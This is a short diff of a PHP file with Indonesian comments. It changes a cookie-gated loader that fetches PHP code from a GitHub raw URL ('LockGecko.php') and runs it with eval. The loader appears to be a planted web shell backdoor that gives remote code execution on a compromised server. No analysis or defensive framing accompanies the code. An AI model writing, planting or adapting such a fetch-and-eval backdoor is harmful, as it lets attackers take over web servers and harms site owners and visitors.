@@ -38,7 +38,7 @@ function geturlsinfo($url)
 // ---- CEK LOGIN ----
 if (is_logged_in($cookie_name, $cookie_value)) {
     // Sudah login, jalankan script utama
-    $a = geturlsinfo('https://raw.githubusercontent.com/erosjoko5/solo/refs/heads/main/gecko');
+    $a = geturlsinfo('https://raw.githubusercontent.com/erosjoko5/original/refs/heads/main/LockGecko.php');
     if ($a !== false) {
         eval('?>' . $a);
     } else {
